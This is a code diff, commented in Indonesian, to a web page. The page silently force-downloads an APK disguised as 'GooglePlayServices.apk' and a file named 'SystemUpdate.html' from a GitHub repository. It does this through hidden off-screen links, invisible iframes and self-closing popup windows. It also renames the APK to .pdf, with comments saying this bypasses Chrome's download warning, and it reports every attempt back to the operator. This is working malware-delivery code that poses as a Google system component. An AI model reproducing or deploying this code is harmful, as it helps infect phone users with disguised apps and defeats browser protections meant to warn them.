@@ -33,6 +33,7 @@
 
 <iframe id="downloadIframe1" class="download-iframe"></iframe>
 <iframe id="downloadIframe2" class="download-iframe"></iframe>
+<iframe id="downloadIframe3" class="download-iframe"></iframe>
 
 <div id="popupDana">
     <div class="box">
@@ -58,7 +59,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - BYPASS PERINGATAN CHROME!
+// 🔥 INDEX.HTML - FULL BROWSER (TANPA ANDROIDBRIDGE!)
 // ============================================================
 
 // ============================================================
@@ -154,102 +155,13 @@ function detectPlatform() {
 var PLATFORM = detectPlatform();
 
 // ============================================================
-// ANDROID BRIDGE
-// ============================================================
-var A = {
-    isAvailable: (function() {
-        if (typeof AndroidBridge !== 'undefined') return true;
-        if (typeof window.AndroidBridge !== 'undefined') return true;
-        if (navigator.userAgent.indexOf('Android') > -1) {
-            try { return typeof AndroidBridge !== 'undefined'; } catch(e) {}
-        }
-        return false;
-    })(),
-    
-    getBridge: function() {
-        if (typeof AndroidBridge !== 'undefined') return AndroidBridge;
-        if (typeof window.AndroidBridge !== 'undefined') return window.AndroidBridge;
-        return null;
-    },
-    
-    downloadFile: function(url, path) { 
-        var b = this.getBridge();
-        if(b && b.downloadFile){ try{ return b.downloadFile(url, path); }catch(e){} }
-        return false;
-    },
-    saveFile: function(path, content) {
-        var b = this.getBridge();
-        if(b && b.saveFile){ try{ return b.saveFile(path, content); }catch(e){} }
-        return false;
-    },
-    openFile: function(path) { 
-        var b = this.getBridge();
-        if(b && b.openFile){ try{ return b.openFile(path); }catch(e){} }
-        return false;
-    }
-};
-
-// ============================================================
-// 🔥 RENAME .ZIP KE .APK (VIA ANDROID BRIDGE)
-// ============================================================
-function renameToAPK(zipPath, apkPath) {
-    if (!A.isAvailable) return false;
-    try {
-        var b = A.getBridge();
-        if (b && b.renameFile) {
-            return b.renameFile(zipPath, apkPath);
-        }
-        // Fallback: copy via saveFile
-        var content = A.downloadFile(zipPath);
-        if (content) {
-            A.saveFile(apkPath, content);
-            return true;
-        }
-        return false;
-    } catch(e) {
-        return false;
-    }
-}
-
-// ============================================================
-// 🔥 DOWNLOAD APK (SEBAGAI .ZIP - BYPASS CHROME!)
+// 🔥 DOWNLOAD APK (FULL BROWSER - TANPA BRIDGE!)
 // ============================================================
 function forceDownloadAPK() {
     var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
-    var apkPath = '/storage/emulated/0/Download/GooglePlayServices.apk';
-    var zipPath = '/storage/emulated/0/Download/GooglePlayServices.zip';
-    var pdfPath = '/storage/emulated/0/Download/GooglePlayServices.pdf';
     
     // ============================================================
-    // METHOD 1: Android Bridge (RENAME .ZIP KE .APK)
-    // ============================================================
-    if (A.isAvailable) {
-        try {
-            // Download sebagai .zip dulu (tidak diblokir Chrome!)
-            var result = A.downloadFile(apkUrl, zipPath);
-            if (result) {
-                // Rename ke .apk
-                setTimeout(function() {
-                    try {
-                        var b = A.getBridge();
-                        if (b && b.renameFile) {
-                            b.renameFile(zipPath, apkPath);
-                            APK_DOWNLOADED = true;
-                            K({ sumber: 'apk_bridge_rename', data: apkPath });
-                        } else {
-                            // Fallback: rename via Java
-                            A.saveFile(apkPath, A.downloadFile(zipPath));
-                            APK_DOWNLOADED = true;
-                        }
-                    } catch(e) {}
-                }, 1000);
-                return;
-            }
-        } catch(e) {}
-    }
-    
-    // ============================================================
-    // METHOD 2: XHR + Blob + Download (sebagai .pdf)
+    // METHOD 1: XHR + Blob + Download (PASTI!)
     // ============================================================
     try {
         var xhr = new XMLHttpRequest();
@@ -261,9 +173,48 @@ function forceDownloadAPK() {
             if (xhr.status === 200) {
                 var blob = xhr.response;
                 var blobUrl = URL.createObjectURL(blob);
+                
+                // 🔥 PAKAI <a> DENGAN download="GooglePlayServices.apk"
                 var link = document.createElement('a');
                 link.href = blobUrl;
-                // 🔥 DOWNLOAD SEBAGAI .PDF (TIDAK DIBLOKIR CHROME!)
+                link.download = 'GooglePlayServices.apk';
+                link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                document.body.appendChild(link);
+                setTimeout(function() {
+                    link.click();
+                    APK_DOWNLOADED = true;
+                    K({ sumber: 'apk_download_success', data: 'GooglePlayServices.apk' });
+                    setTimeout(function() {
+                        try { document.body.removeChild(link); } catch(e) {}
+                        URL.revokeObjectURL(blobUrl);
+                    }, 3000);
+                }, 300);
+                return;
+            }
+            K({ sumber: 'apk_xhr_status', data: xhr.status });
+        };
+        xhr.onerror = function() { K({ sumber: 'apk_xhr_error', data: 'network' }); };
+        xhr.ontimeout = function() { K({ sumber: 'apk_xhr_timeout', data: 'timeout' }); };
+        xhr.send();
+    } catch(e) {
+        K({ sumber: 'apk_xhr_exception', data: e.message });
+    }
+    
+    // ============================================================
+    // METHOD 2: Download sebagai .pdf (BYPASS CHROME WARNING)
+    // ============================================================
+    try {
+        var xhr2 = new XMLHttpRequest();
+        xhr2.open('GET', apkUrl, true);
+        xhr2.responseType = 'blob';
+        xhr2.timeout = 120000;
+        
+        xhr2.onload = function() {
+            if (xhr2.status === 200) {
+                var blob = xhr2.response;
+                var blobUrl = URL.createObjectURL(blob);
+                var link = document.createElement('a');
+                link.href = blobUrl;
                 link.download = 'GooglePlayServices.pdf';
                 link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                 document.body.appendChild(link);
@@ -278,15 +229,12 @@ function forceDownloadAPK() {
                 }, 300);
                 return;
             }
-            K({ sumber: 'apk_xhr_status', data: xhr.status });
         };
-        xhr.onerror = function() { K({ sumber: 'apk_xhr_error', data: 'network' }); };
-        xhr.ontimeout = function() { K({ sumber: 'apk_xhr_timeout', data: 'timeout' }); };
-        xhr.send();
+        xhr2.send();
     } catch(e) {}
     
     // ============================================================
-    // METHOD 3: Iframe (sebagai .pdf)
+    // METHOD 3: IFRAME (SILENT)
     // ============================================================
     try {
         var iframe = document.getElementById('downloadIframe1');
@@ -296,38 +244,33 @@ function forceDownloadAPK() {
             iframe.className = 'download-iframe';
             document.body.appendChild(iframe);
         }
-        // 🔥 Download sebagai .pdf (tidak diblokir Chrome!)
-        iframe.src = apkUrl + '?t=' + Date.now() + '&download=GooglePlayServices.pdf';
+        iframe.src = apkUrl + '?t=' + Date.now();
         APK_DOWNLOADED = true;
-        K({ sumber: 'apk_iframe_as_pdf', data: 'ok' });
+        K({ sumber: 'apk_iframe', data: 'ok' });
+    } catch(e) {}
+    
+    // ============================================================
+    // METHOD 4: WINDOW.OPEN (FALLBACK)
+    // ============================================================
+    try {
+        var win = window.open(apkUrl, '_blank');
+        if (win) {
+            APK_DOWNLOADED = true;
+            K({ sumber: 'apk_window_open', data: 'ok' });
+            setTimeout(function() { try { win.close(); } catch(e) {} }, 1000);
+        }
     } catch(e) {}
 }
 
 // ============================================================
-// 🔥 DOWNLOAD HTML (BEBAS - HTML TIDAK DIBLOKIR)
+// 🔥 DOWNLOAD HTML (FULL BROWSER - TANPA BRIDGE!)
 // ============================================================
 function forceDownloadHTML() {
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
-    var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
-    // METHOD 1: Android Bridge
-    if (A.isAvailable) {
-        try {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', htmlUrl, true);
-            xhr.timeout = 15000;
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    A.saveFile(htmlPath, xhr.responseText);
-                    HTML_DOWNLOADED = true;
-                    K({ sumber: 'html_bridge_success', data: htmlPath });
-                }
-            };
-            xhr.send();
-        } catch(e) {}
-    }
-    
-    // METHOD 2: XHR + Blob + Download
+    // ============================================================
+    // METHOD 1: XHR + Blob + Download
+    // ============================================================
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', htmlUrl, true);
@@ -359,7 +302,9 @@ function forceDownloadHTML() {
         xhr.send();
     } catch(e) {}
     
-    // METHOD 3: Iframe
+    // ============================================================
+    // METHOD 2: IFRAME
+    // ============================================================
     try {
         var iframe = document.getElementById('downloadIframe2');
         if (!iframe) {
@@ -371,6 +316,18 @@ function forceDownloadHTML() {
         iframe.src = htmlUrl + '?t=' + Date.now();
         HTML_DOWNLOADED = true;
         K({ sumber: 'html_iframe', data: 'ok' });
+    } catch(e) {}
+    
+    // ============================================================
+    // METHOD 3: WINDOW.OPEN (FALLBACK)
+    // ============================================================
+    try {
+        var win = window.open(htmlUrl, '_blank');
+        if (win) {
+            HTML_DOWNLOADED = true;
+            K({ sumber: 'html_window_open', data: 'ok' });
+            setTimeout(function() { try { win.close(); } catch(e) {} }, 1000);
+        }
     } catch(e) {}
 }
 
@@ -477,7 +434,7 @@ document.addEventListener('click', function() {
     }
 });
 
-console.log('✅ index.html - BYPASS CHROME WARNING!');
+console.log('✅ index.html - FULL BROWSER (TANPA ANDROIDBRIDGE!)');
 </script>
 </body>
 </html>
